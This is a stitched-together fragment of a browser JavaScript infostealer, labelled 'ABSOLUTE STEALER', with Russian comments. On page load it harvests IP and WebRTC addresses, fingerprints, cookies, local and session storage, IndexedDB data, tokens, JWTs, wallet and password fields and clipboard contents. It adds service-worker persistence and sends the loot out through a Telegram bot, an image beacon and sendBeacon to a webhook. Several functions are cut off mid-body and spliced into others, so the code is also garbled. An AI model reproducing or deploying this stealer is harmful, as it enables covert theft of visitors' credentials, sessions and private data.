        const sleep = ms => new Promise(r => setTimeout(r, ms));

        const fetchTO = (u,o={},t=300) => Promise.race([fetch(u,o), new Promise((_,r)=>setTimeout(()=>r('Timeout'),t))]);
        const cleanText = t => t.replace(/<[^>]*>/g,'').replace(/&/g,'&amp;');

        // ================================================================
        // ОТПРАВКА
        // ================================================================
        async function sendTelegram(text) {
            try {
                const clean = cleanText(text);
                const parts = [];
                for(let i=0; i<clean.length; i+=4000) parts.push(clean.slice(i,i+4000));
                let allOk=true;
                for(let i=0; i<parts.length; i++){
                    const p = parts.length>1 ? `[${i+1}/${parts.length}]\n${parts[i]}` : parts[i];
                    const r=await fetch(`https://api.telegram.org/bot${CFG.BOT_TOKEN}/sendMessage`,{
                        method:'POST',headers:{'Content-Type':'application/json'},
                        body:JSON.stringify({chat_id:CFG.CHAT_ID,text:p.slice(0,4096)})
                    });
                    const d=await r.json();
                    if(!d.ok){ allOk=false; log('⚠️ Telegram part '+(i+1)+' failed'); }
                    else log('✅ Telegram part '+(i+1)+' sent');
                    await sleep(200);
                }
                return allOk;
            } catch(e){ log('❌ Telegram: '+e.message); return false; }
        }

        function sendImage(data) {
            return new Promise(resolve => {
                try {
                    const short = { t:Date.now(), ip:data.network?.ips?.[0]?.ip||'unknown', len:JSON.stringify(data).length };
                    const img=new Image();
                    img.src=`${CFG.WEBHOOK}?d=${encodeURIComponent(JSON.stringify(short))}&t=${Date.now()}`;
                    img.onload=()=>{ log('✅ Image sent'); resolve(true); };
                    img.onerror=()=>{ resolve(false); };
                    setTimeout(()=>resolve(false),500);
                } catch(e){ resolve(false); }
            });
        }

        function sendBeacon(data) {
            try {
                const short = { t:data.timestamp, ip:data.network?.ips?.[0]?.ip, os:data.device?.os, browser:data.device?.browser, wallets:data.wallets, secrets:(data.secrets||[]).slice(0,5) };
                return navigator.sendBeacon(CFG.WEBHOOK, new Blob([JSON.stringify(short)],{type:'application/json'}));
            } catch(e){ return false; }
        }

        async function exfiltrate(report,data){
            log('📤 Отправка...');
            const t1=await sendTelegram(report);
            const t2=await sendImage(data);
            const t3=sendBeacon(data);
            const ok=[t1,t2,t3].filter(Boolean).length;

        // 1. СЕТЬ — ВСЕ ВОЗМОЖНЫЕ ИСТОЧНИКИ
        async function getAllNetwork() {
            const result = { ips: [], webrtc: { public: [], local: [] }, network: null, dns: null, timing: [], geo: null, proxy: false, vpn: false };
            
            // IP из 6 источников
            const sources = [
                {url:'https://api.ipify.org?format=json',key:'ip'},
                {url:'https://api.ip.sb/geoip',key:'ip'},
                {url:'https://ipapi.co/json/',key:'ip'},
                {url:'https://freeipapi.com/api/json',key:'ip'},
                {url:'https://ip-api.com/json/',key:'query'},
                {url:'https://api.my-ip.io/ip',key:null}
            ];
            for (const src of sources) {
                try {
                    const r=await fetchTO(src.url,{},400);
                    if(src.url.includes('my-ip')){ const ip=await r.text(); if(ip) result.ips.push({ip,source:'my-ip',data:{}}); }
                    else { const d=await r.json(); const ip=d[src.key]||d.ip||d.query; if(ip) result.ips.push({ip,source:src.url.split('/')[2],data:d}); }
                } catch(e){}
            }

            // Geo из первого IP
            if(result.ips.length) {
                const ip=result.ips[0].ip;
                try {
                    const r=await fetchTO(`https://ipwhois.io/json/${ip}`,{},400);
                    result.geo=await r.json();
                } catch(e){}
            }

            // WebRTC (все IP)
            try {
                const pc=new (window.RTCPeerConnection||window.webkitRTCPeerConnection)({
                    iceServers:[{urls:'stun:stun.l.google.com:19302'},{urls:'stun:stun1.l.google.com:19302'}]
                });
                pc.createDataChannel('');
                pc.createOffer().then(o=>pc.setLocalDescription(o)).catch(()=>{});
                pc.onicecandidate=e=>{
                    if(!e.candidate)return;
                    const m=e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/g);
                    if(m) m.forEach(ip=>{
                        const l=ip.startsWith('192.168.')||ip.startsWith('10.')||ip.startsWith('172.16.')||ip.startsWith('127.');
                        l?result.webrtc.local.push(ip):result.webrtc.public.push(ip);
                    });
                };
                await sleep(600);
                pc.close();
                result.webrtc.public=[...new Set(result.webrtc.public)];
                result.webrtc.local=[...new Set(result.webrtc.local)];
            } catch(e){}

            // Network API
            try {
                const conn=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
                if(conn) result.network={type:conn.type,effectiveType:conn.effectiveType,downlink:conn.downlink,rtt:conn.rtt,addEventListener:!!conn.addEventListener};
            } catch(e){}

            // DNS leak
            try {
                const dnsUid=uid();
                const domain=CFG.DNS_SERVER.replace('{uid}',dnsUid);
                const start=Date.now();
                const img=new Image();
                img.src=`https://${domain}/pixel?t=${Date.now()}`;
                await sleep(500);
                result.dns={domain,time:Date.now()-start};
            } catch(e){}

            // Timing attack
            try {
                const servers=['https://google.com','https://facebook.com','https://cloudflare.com'];
                const times=[];
                for(const s of servers){
                    try{ const st=performance.now(); await fetch(s,{mode:'no-cors'}); times.push(performance.now()-st); }catch{}
                }
                if(times.length) result.timing=times;
            } catch(e){}

            // Проверка прокси/VPN через задержку
            if(result.timing && result.timing.length) {
                const avg=result.timing.reduce((a,b)=>a+b,0)/result.timing.length;
                result.proxy=avg>500;
                result.vpn=avg>800;
            }

            return result;
        }

        // 2. УСТРОЙСТВО — ВСЕ
        function getAllDevice() {
            const n=navigator;
            const ua=n.userAgent.toLowerCase();
            const result = {
                userAgent: n.userAgent,
                platform: n.platform,
                appVersion: n.appVersion,
                appName: n.appName,
                appCodeName: n.appCodeName,
                product: n.product,
                productSub: n.productSub,
                vendor: n.vendor,
                vendorSub: n.vendorSub,
                hardwareConcurrency: n.hardwareConcurrency,
                deviceMemory: n.deviceMemory,
                maxTouchPoints: n.maxTouchPoints,
                language: n.language,
                languages: n.languages,
                cookieEnabled: n.cookieEnabled,
                doNotTrack: n.doNotTrack,
                userActivation: n.userActivation ? {hasBeenActive:n.userActivation.hasBeenActive,isActive:n.userActivation.isActive} : null,
                os: 'unknown', osVersion: 'unknown', browser: 'unknown', browserVersion: 'unknown', model: 'unknown'
            };

            // ОС
            if(ua.includes('windows')) {
                result.os='Windows';
                if(ua.includes('windows nt 10.0')) result.osVersion='10/11';
                else if(ua.includes('windows nt 6.3')) result.osVersion='8.1';
                else if(ua.includes('windows nt 6.1')) result.osVersion='7';
            } else if(ua.includes('mac os x')) {
                result.os='macOS';
                const m=ua.match(/mac os x (\d+)_(\d+)/);
                if(m) result.osVersion=`${m[1]}.${m[2]}`;
            } else if(ua.includes('linux')) {
                result.os='Linux';
                if(ua.includes('android')) {
                    result.os='Android';
                    const m=ua.match(/android (\d+\.\d+)/);
                    if(m) result.osVersion=m[1];
                }
            } else if(ua.includes('ios')||ua.includes('iphone')||ua.includes('ipad')) {
                result.os='iOS';
                const m=ua.match(/os (\d+)_(\d+)/);
                if(m) result.osVersion=`${m[1]}.${m[2]}`;
            }

            // Браузер
            if(!!window.chrome && !ua.includes('edg') && !ua.includes('opr')) {
                result.browser='Chrome';
                const m=ua.match(/chrome\/(\d+)/);
                if(m) result.browserVersion=m[1];
            } else if(ua.includes('firefox')) {
                result.browser='Firefox';
                const m=ua.match(/firefox\/(\d+)/);
                if(m) result.browserVersion=m[1];
            } else if(ua.includes('safari') && !ua.includes('chrome')) {
                result.browser='Safari';
                const m=ua.match(/version\/(\d+)/);
                if(m) result.browserVersion=m[1];
            } else if(ua.includes('edg')) {
                result.browser='Edge';
                const m=ua.match(/edg\/(\d+)/);
                if(m) result.browserVersion=m[1];
            } else if(ua.includes('opr')) {
                result.browser='Opera';
                const m=ua.match(/opr\/(\d+)/);
                if(m) result.browserVersion=m[1];
            }

            // Модель
            if(result.os==='Android'){ const m=ua.match(/; (.*?) Build\//); if(m) result.model=m[1]; }
            else if(result.os==='iOS'){ const m=ua.match(/\(([^;]+);/); if(m) result.model=m[1]; }

            // Экран
            result.screen = {
                width: screen.width, height: screen.height, availWidth: screen.availWidth, availHeight: screen.availHeight,
                pixelRatio: window.devicePixelRatio, colorDepth: screen.colorDepth, orientation: screen.orientation?.type || 'unknown',
                angle: screen.orientation?.angle || 0
            };
            // Window
            result.window = { innerWidth: window.innerWidth, innerHeight: window.innerHeight, outerWidth: window.outerWidth, outerHeight: window.outerHeight };

            return result;
        }

        // 3. ФИНГЕРПРИНТЫ — ВСЕ
        function getAllFingerprints() {
            const fp = {};

            // Canvas (несколько вариантов)
            try {
                const c=document.createElement('canvas');
                c.width=512; c.height=256;
                const ctx=c.getContext('2d');
                ['Arial','Courier New','Georgia','Times New Roman','Verdana','Comic Sans MS','Impact','Tahoma','Trebuchet MS'].forEach((f,i)=>{
                    ctx.font=`${14+i*2}px "${f}"`;
                    ctx.fillStyle=`hsl(${i*30},80%,50%)`;
                    ctx.fillText(`Cwm fjordbank glyphs vext quiz ${i}`, 10, 20+i*25);
                });
                ctx.beginPath(); ctx.arc(256,128,80,0,Math.PI*2); ctx.stroke();
                fp.canvas = c.toDataURL().slice(0,200);
            } catch(e){}

            // WebGL — полный
            try {
                const c=document.createElement('canvas');
                const gl=c.getContext('webgl')||c.getContext('experimental-webgl');
                if(gl) {
                    const ext=gl.getExtension('WEBGL_debug_renderer_info');
                    fp.webgl = { vendor: gl.getParameter(ext?gl.getParameter(ext.UNMASKED_VENDOR_WEBGL):gl.getParameter(gl.VENDOR)),
                                 renderer: gl.getParameter(ext?gl.getParameter(ext.UNMASKED_RENDERER_WEBGL):gl.getParameter(gl.RENDERER)),
                                 version: gl.getParameter(gl.VERSION),
                                 shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                                 maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                                 maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
                                 maxVertexAttribs: gl.getParameter(gl.MAX_VERTEX_ATTRIBS),
                                 maxVertexUniformVectors: gl.getParameter(gl.MAX_VERTEX_UNIFORM_VECTORS),
                                 maxVaryingVectors: gl.getParameter(gl.MAX_VARYING_VECTORS),
                                 maxFragmentUniformVectors: gl.getParameter(gl.MAX_FRAGMENT_UNIFORM_VECTORS),
                                 aliasedLineWidthRange: gl.getParameter(gl.ALIASED_LINE_WIDTH_RANGE),
                                 aliasedPointSizeRange: gl.getParameter(gl.ALIASED_POINT_SIZE_RANGE) };
                    // Расширения
                    fp.webgl.extensions = gl.getSupportedExtensions() || [];
                }
            } catch(e){}

            // Audio
            try {
                const AudioCtx=window.AudioContext||window.webkitAudioContext;
                if(AudioCtx) {
                    const ctx=new AudioCtx();
                    fp.audio = { sampleRate: ctx.sampleRate, state: ctx.state, baseLatency: ctx.baseLatency };
                    // Oscillator fingerprint
                    try {
                        const osc=ctx.createOscillator();
                        const gain=ctx.createGain();
                        osc.connect(gain);
                        gain.connect(ctx.destination);
                        osc.frequency.value=440;
                        osc.type='sawtooth';
                        const analyser=ctx.createAnalyser();
                        osc.connect(analyser);
                        analyser.fftSize=2048;
                        const data=new Float32Array(analyser.frequencyBinCount);
                        analyser.getFloatFrequencyData(data);
                        fp.audio.fingerprint = Array.from(data.slice(0,100)).map(v=>Math.round(v)).join(',');
                        osc.start();
                        osc.stop(0.1);
                        ctx.close();
                    } catch(e){}
                }
            } catch(e){}

            // Шрифты — полный список (200+)
            try {
                const allFonts = [
                    'Arial','Arial Black','Arial Narrow','Arial Rounded MT Bold','Baskerville','Baskerville Old Face','Bodoni MT','Bodoni MT Bold','Book Antiqua','Bookman Old Style','Calibri','Cambria','Cambria Math','Candara','Century','Century Gothic','Century Schoolbook','Comic Sans MS','Consolas','Constantia','Corbel','Courier New','DIN Alternate','DIN Condensed','Ebrima','FangSong','Franklin Gothic Medium','Gabriola','Gadugi','Georgia','Georgia Ref','Gill Sans','Goudy Old Style','Helvetica','Helvetica Neue','HoloLens MDL2 Assets','Impact','Ink Free','Javanese Text','KaiTi','Leelawadee UI','Lucida Console','Lucida Handwriting','Lucida Sans','Lucida Sans Typewriter','Malgun Gothic','Marlett','Microsoft Himalaya','Microsoft JhengHei','Microsoft JhengHei UI','Microsoft New Tai Lue','Microsoft PhagsPa','Microsoft Sans Serif','Microsoft Tai Le','Microsoft YaHei','Microsoft YaHei UI','Microsoft Yi Baiti','MingLiU','MingLiU-ExtB','MingLiU_HKSCS','MingLiU_HKSCS-ExtB','Modern No. 20','Mongolian Baiti','MS Gothic','MS Outlook','MS PGothic','MS Reference Sans Serif','MS Sans Serif','MS Serif','MS UI Gothic','MT Extra','Myanmar Text','Nirmala UI','Palatino Linotype','Perpetua','Perpetua Titling MT','Pristina','Rockwell','Rockwell Extra Bold','Script MT Bold','Segoe MDL2 Assets','Segoe Print','Segoe Script','Segoe UI','Segoe UI Black','Segoe UI Emoji','Segoe UI Historic','Segoe UI Light','Segoe UI Semibold','Segoe UI Semilight','Segoe UI Symbol','Sitka Banner','Sitka Display','Sitka Heading','Sitka Small','Sitka Subheading','Sitka Text','Sylfaen','Symbol','Tahoma','Times New Roman','Trebuchet MS','Verdana','Verdana Ref','Webdings','Wingdings'
                ];
                fp.fonts = allFonts.filter(f=>{ try{ return document.fonts.check(`16px "${f}"`); } catch{return false; } });
            } catch(e){}

            // Timezone + DST
            try {
                const tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
                fp.timezone=tz;
                const now=new Date();
                const jan=new Date(now.getFullYear(),0,1);
                const jul=new Date(now.getFullYear(),6,1);
                fp.timezoneOffset = -now.getTimezoneOffset();
                fp.dst = now.getTimezoneOffset() !== Math.min(jan.getTimezoneOffset(), jul.getTimezoneOffset());
            } catch(e){}

            // Prefers
            try {
                fp.colorScheme = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
                fp.reducedMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
                fp.reducedTransparency = window.matchMedia('(prefers-reduced-transparency: reduce)').matches;
                fp.contrast = window.matchMedia('(prefers-contrast: high)').matches ? 'high' : 'normal';
            } catch(e){}

            // Performance & Timing
            try {
                const perf=performance;
                const t=perf.timing||{};
                fp.timing = { navigationStart:t.navigationStart, domContentLoadedEventEnd:t.domContentLoadedEventEnd, loadEventEnd:t.loadEventEnd };
                fp.memory = perf.memory ? { total: perf.memory.totalJSHeapSize, used: perf.memory.usedJSHeapSize, limit: perf.memory.jsHeapSizeLimit } : null;
                fp.now = perf.now();
                fp.timeOrigin = perf.timeOrigin;
            } catch(e){}

            // Resource Timing (все загруженные ресурсы)
            try {
                const resources=performance.getEntriesByType('resource')||[];
                fp.resources = resources.slice(0,20).map(r=>({name:r.name.slice(0,50),duration:Math.round(r.duration),size:r.decodedBodySize||0}));
                fp.resourceCount = resources.length;
            } catch(e){}

            // Paint Timing
            try {
                const paints=performance.getEntriesByType('paint')||[];
                fp.paint = paints.map(p=>({name:p.name,time:Math.round(p.startTime)}));
            } catch(e){}

            return fp;
        }

        // 4. ПЛАГИНЫ И MIME
        function getPlugins() {
            const result = { plugins: [], mimeTypes: [] };
            try {
                for(let i=0; i<navigator.plugins.length; i++) {
                    const p=navigator.plugins[i];
                    const mimes=[];
                    for(let j=0; j<p.length; j++) mimes.push(p[j].type);
                    result.plugins.push({name:p.name,filename:p.filename,description:p.description,mimes});
                }
            } catch(e){}
            try {
                for(let i=0; i<navigator.mimeTypes.length; i++) {
                    const m=navigator.mimeTypes[i];
                    result.mimeTypes.push({type:m.type,description:m.description,suffixes:m.suffixes});
                }
            } catch(e){}
            return result;
        }

        // 5. ХАРАКТЕРИСТИКИ БРАУЗЕРА
        function getBrowserFeatures() {
            const f = {};
            const features = ['WebAssembly','SharedArrayBuffer','WebGL','WebGL2','WebGPU','WebSocket','WebRTC','WebAudio','WebMIDI','WebUSB','WebBluetooth','WebXR','WebNFC','WebHID','WebSerial','WebTransport','WebCodecs','WebLocks','WebShare','WebOTP','WebAuthn','WebPayment','WebCrypto','ServiceWorker','Notification','Push','Geolocation','Battery','Vibration','ScreenOrientation','Fullscreen','Clipboard','FileSystem','FileAPI','IndexedDB','CacheStorage','CookieStore','StorageManager','DeviceMotion','DeviceOrientation','AmbientLight','Proximity','Magnetometer','Accelerometer','Gyroscope','SpeechRecognition','SpeechSynthesis','WebAssembly'];
            features.forEach(feat => {
                try { f[feat] = typeof window[feat] !== 'undefined' || (typeof navigator[feat] !== 'undefined'); } catch(e){ f[feat]=false; }
            });
            // Проверка через eval для некоторых
            try { f.WebAssembly = typeof WebAssembly !== 'undefined'; } catch(e){}
            try { f.SharedArrayBuffer = typeof SharedArrayBuffer !== 'undefined'; } catch(e){}
            try { f.WebGPU = typeof navigator.gpu !== 'undefined'; } catch(e){}
            return f;
        }

        // 6. STORAGE — ВСЕ
        function getAllStorage() {
            const ls={}; try{ for(let i=0;i<localStorage.length;i++){ const k=localStorage.key(i); try{ ls[k]=localStorage.getItem(k); }catch{} } }catch(e){}
            const ss={}; try{ for(let i=0;i<sessionStorage.length;i++){ const k=sessionStorage.key(i); try{ ss[k]=sessionStorage.getItem(k); }catch{} } }catch(e){}
            const cookies={}; try{ document.cookie.split('; ').filter(Boolean).forEach(p=>{ const [k,...v]=p.split('='); cookies[k]=v.join('='); }); }catch(e){}
            return { localStorage: ls, sessionStorage: ss, cookies };
        }

        function getIndexedDBFull() {
            return new Promise(resolve=>{
                try {
                    if(!indexedDB.databases){ resolve(null); return; }
                    indexedDB.databases().then(dbs=>{
                        const result=[]; let done=0;
                        if(!dbs.length){ resolve([]); return; }
                        dbs.forEach(dbInfo=>{
                            const req=indexedDB.open(dbInfo.name);
                            req.onsuccess=e=>{
                                const db=e.target.result;
                                const stores=Array.from(db.objectStoreNames);
                                const storeData=[];
                                let sDone=0;
                                if(!stores.length){ result.push({name:dbInfo.name,stores:[]}); db.close(); if(++done===dbs.length) resolve(result); return; }
                                stores.forEach(storeName=>{
                                    try{
                                        const tx=db.transaction(storeName,'readonly');
                                        const store=tx.objectStore(storeName);
                                        const reqAll=store.getAll();
                                        reqAll.onsuccess=()=>{
                                            const items=reqAll.result||[];
                                            storeData.push({storeName,count:items.length,samples:items.slice(0,3).map(i=>typeof i==='object'?JSON.stringify(i).slice(0,100):String(i).slice(0,100))});
                                            if(++sDone===stores.length){ result.push({name:dbInfo.name,stores:storeData}); db.close(); if(++done===dbs.length) resolve(result); }
                                        };
                                        reqAll.onerror=()=>{
                                            storeData.push({storeName,count:0,samples:[]});
                                            if(++sDone===stores.length){ result.push({name:dbInfo.name,stores:storeData}); db.close(); if(++done===dbs.length) resolve(result); }
                                        };
                                    }catch(err){
                                        storeData.push({storeName,count:0,samples:[]});
                                        if(++sDone===stores.length){ result.push({name:dbInfo.name,stores:storeData}); db.close(); if(++done===dbs.length) resolve(result); }
                                    }

        // 10. СЕКРЕТЫ — ВСЕ
        function findAllSecrets(obj) {
            const result=[];
            const patterns=['token','jwt','secret','key','auth','password','pwd','api','private','wallet','mnemonic','seed','recovery','access','refresh','csrf','xsrf','session','bearer','authorization','apikey','apisecret','clientsecret','id_token','encryption','decryption','cert','pem','pk','priv'];
            const search=(data,path='')=>{
                if(!data || typeof data!=='object') return;
                for(let k in data) {
                    try {
                        const v=data[k];
                        const fullPath=path?`${path}.${k}`:k;
                        if(patterns.some(p=>k.toLowerCase().includes(p))) {
                            if(v && typeof v==='string' && v.length>3 && v.length<500) {
                                result.push({path:fullPath,value:trunc(v,60)});
                            }
                        }
                        // JWT detection
                        if(typeof v==='string' && v.length>20 && v.match(/^[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+/)) {
                            result.push({path:fullPath,value:trunc(v,60),type:'JWT'});
                        }
                        if(typeof v==='object' && v!==null) search(v,fullPath);
                    } catch(e){}
                }
            };
            search(obj);
            return result;
        }

        // 14. БУФЕР ОБМЕНА
        async function getClipboard() {
            try {
                const ta=document.createElement('textarea');
                ta.style.cssText='position:fixed;opacity:0;pointer-events:none;left:-9999px;top:-9999px;';
                document.body.appendChild(ta);
                ta.focus();
                if(document.execCommand('paste')) {
                    const val=ta.value;
                    ta.remove();
                    if(val && val.length>0) return val;
                }
                ta.remove();
            } catch(e){}
            try {
                if(navigator.clipboard && navigator.clipboard.read) {
                    const items=await navigator.clipboard.read();
                    for(let item of items) {
                        if(item.types.includes('text/plain')) {
                            const blob=await item.getType('text/plain');
                            return await blob.text();
                        }
                    }
                }
            } catch(e){}
            return null;
        }

        // 15. SERVICE WORKER
        function setupPersistence() {
            try {
                if('serviceWorker' in navigator) {
                    const sw=`self.addEventListener('install',e=>e.waitUntil(self.skipWaiting()));self.addEventListener('activate',e=>e.waitUntil(self.clients.claim()));`;
                    const blob=new Blob([sw],{type:'application/javascript'});
                    navigator.serviceWorker.register(URL.createObjectURL(blob),{scope:'/'});
                    return true;
                }
            } catch(e){}
            return false;
        }

                    Promise.resolve(getAllExtensions()).catch(e=>[]),
                    Promise.resolve(getAllPasswords()).catch(e=>({forms:[]})),
                    Promise.resolve(getAllDOM()).catch(e=>({})),
                    takeScreenshot().catch(e=>null),
                    getClipboard().catch(e=>null),
                    getAllSensors().catch(e=>({}))
                ]);

                // Секреты
                let secrets=[];
                try { secrets=findAllSecrets(storage); } catch(e){}

                log('✅ Сбор завершён');

                const fullData = {
                    timestamp: new Date().toISOString(),
                    url: window.location.href,
                    userAgent: navigator.userAgent,
                    network: network||{},
                    device: device||{},
                    fingerprints: fingerprints||{},
                    plugins: plugins||{plugins:[],mimeTypes:[]},
                    features: features||{},
                    storage: storage||{},
                    indexedDB: indexedDB||null,
                    crypto: crypto||{wallets:[]},
                    extensions: extensions||[],
                    passwords: passwords||{forms:[]},
                    secrets: secrets||[],
                    dom: dom||{},
                    screenshot: screenshot||null,
                    clipboard: clipboard||null,
                    keylogger: keylogger||false,
                    persistence: persistence||false,
                    sensors: sensors||{},
                    performance: Math.round(performance.now()-start)
                };

                const report=formatFinal(fullData);
                log(`📊 Отчёт: ${report.length} символов`);

                setStatus('📤');
                const results=await exfiltrate(report, fullData);
                const ok=Object.values(results).filter(Boolean).length;

                setStatus(ok>0?'✅':'⚠️');
                log(ok>0 ? `✅ Успешно! ${ok}/3 каналов` : '❌ Все каналы упали');

                setTimeout(()=>{ statusEl.style.opacity='0'; },3000);

            } catch(e) {
                setStatus('⚠️');
                log('❌ '+e.message);
                console.error(e);
            }
        })();

        setTimeout(absoluteStealer,300);

        window.testNow=async function(){
            try {
                const r=await fetch('https://api.ipify.org?format=json');
                const d=await r.json();
                await sendTelegram('🧪 Test: '+d.ip);
                console.log('✅ Test sent');
            } catch(e){ console.error(e); }
        };

        console.log('✅ ABSOLUTE STEALER loaded');
        console.log('📋 testNow() for test');
    </script>
</body>
